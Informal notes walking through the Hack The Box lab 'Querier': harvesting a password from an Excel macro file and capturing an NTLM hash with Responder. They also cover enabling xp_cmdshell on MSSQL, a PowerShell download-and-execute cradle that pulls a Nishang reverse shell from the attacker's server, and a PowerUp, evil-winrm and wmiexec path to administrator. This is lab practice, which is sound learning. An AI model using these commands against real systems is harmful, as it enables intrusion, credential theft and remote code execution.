
# ROOM IN HTB CALLED QUERIER

- runned nmap scan `nmap scan nmap -A -p- -T5 -Pn 10.10.10.1 -v
- checked if we have file access in smbmap and smbclient 
- finded one fileshare inside of it a file that is xlsm which is windows file excell
- we open it using packege called oletools
- we finded password and user 
- we try to login that user and password in smbmap to find if that user has access to other files
- `smbmap -u saacid -p password -H 10.10.10.1`
- we find out that a sql server is running 


## impacket-mssqlclient
if you have username and password and mysql port is open try to login into mysqlserver
- impacket-mssqlclient saacid:"password"@10.10.10.1 -windows-auth
- if you login 
- try to enumarate 
- what we gonna do is we want the mysql server to respond to as at any way so we  gonna run this command to try to get shares from our ip  
- `xp_dirtree "\\10.10.10.1\putanything here"` our goal is to respond to us
- before we run this we gonna use RESPONDER and run it so it could listen so we could steal it's ntlm hash
- ## responder
- `sudo responder -I tun0`
- when you got the hash try to crack it using hashcat
- then login to mysql server again with user and password you cracked 
- try to get a shell (meaning run command in sqlserver ) run 
- `help`
- `enable_xp_cmdshell`
- `xp_cmdshell whoami` (if it response and run command as this user we will setup netcat listener)
- in the world of getting shells in windows boxes we use github called `Nishang github` and we will go to folder of shells the one we will use is invoke-PowersgekTcp.ps1, OR  just clone the repo 
- know that you have your shell and you changes the ip to your 
- setup netcat litsener
- `nc -lvnp 4444`
- setup your shell in web using python server run 
- `sudo  python -m http.server 80`
- ```what will happen is our when we run the command in sqlserver it gonna go out to server we setup and it will run the shell.ps1 it will give us a shell and we gonna gatch that shell in netcat```
- then in our sql server we we can run commands run 
- `xp_cmdshell powershell -c IEX(New-Object Net.WebClient).downloadstring("http://10.10.10.1/shell.ps1/")` or what you name it)
- now that we have a shell


## POWERUP
now that we have a shell we gonna run powerup inside the shell to get enumaration
download the file in kali setup a server using python 
- to execute the file  in your shell use
- `powershell -c IEX(New-Object Net.WebClient).downloadstring("http://10.10.10.1/powerUp.ps1/")`
- then run `invoke--AllChecks` try to pull down 
- and we got user and password using this

## evil-winrm 
now that we got user and password login to it 
- `evil-winrm -i 10.10.10.1 -u administartor -p password `(sometimes put the password in quotes)
- if this does not work we can try another impacket

## impacket-psexec
try this to login if you have user and pass


## impacket-wmiexec 
you can try to login get a shell like this too 
- impacket-wmiexec 'Administrator:password@10.10.10.1'
